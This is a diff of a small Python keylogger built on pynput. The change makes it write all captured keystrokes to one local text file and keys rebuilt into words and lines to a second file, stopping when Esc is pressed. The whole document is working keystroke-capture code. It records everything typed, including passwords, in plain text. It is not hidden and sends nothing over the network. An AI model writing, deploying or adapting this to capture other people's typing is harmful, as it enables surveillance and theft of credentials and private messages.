@@ -1,44 +1,58 @@
 from pynput import keyboard
 
 
-keylogsfile=open("LoggedKeys.txt",'a')
+Allkeylogsfile=open("AllLoggedKeys.txt",'a')
+keyWordslogs=open("LoggedKeyWords.txt",'a')
 keys=[]
+word_Keys=[]
 
 
 
 def pressed(key):
 
-    global key_count
     global keys  
-  
+    global word_Keys
     try:
         print('{0} pressed'.format(key.char))
         keys.append(key.char)
-        key_count+=1
-    except AttributeError:
-        print('special key {0} pressed'.format(key))
-        keys.append(key)
-        key_count+=1
+        word_Keys.append(key.char)
 
-   
-  
+    except AttributeError:
+        if key == keyboard.Key.space:
+                print('Space key pressed')
+                keys.append(f"<{key}>")
+                word_Keys.append(" ")
+        elif key == keyboard.Key.enter:
+                print('Enter key pressed')
+                keys.append(f"<{key}>")
+                word_Keys.append("\n")
+        else:
+                print(f'Special key {key} pressed')
+                keys.append(f"<{key}>")
+                word_Keys.append(f"<{key}>")
+
+
 
 def released(key):
     print('{0} released'.format( key))
     if key == keyboard.Key.esc:
         write_File(keys)
-        keylogsfile.close()
+        write_File(word_Keys)
+        
         return False
     
   
 def write_File(key):
     for key in keys:
-        if(key==keyboard.Key.space):
-            keylogsfile.write("\n")
-            continue
+        Allkeylogsfile.write(str(key))
+        Allkeylogsfile.write("\n")
+    keys.clear()    
     
-        keylogsfile.write(str(key))
+    for key in word_Keys :
+        keyWordslogs.write(str(key))
+    word_Keys.clear()    
 
 with keyboard.Listener( on_press=pressed, on_release=released) as listener:
     listener.join()
     
+
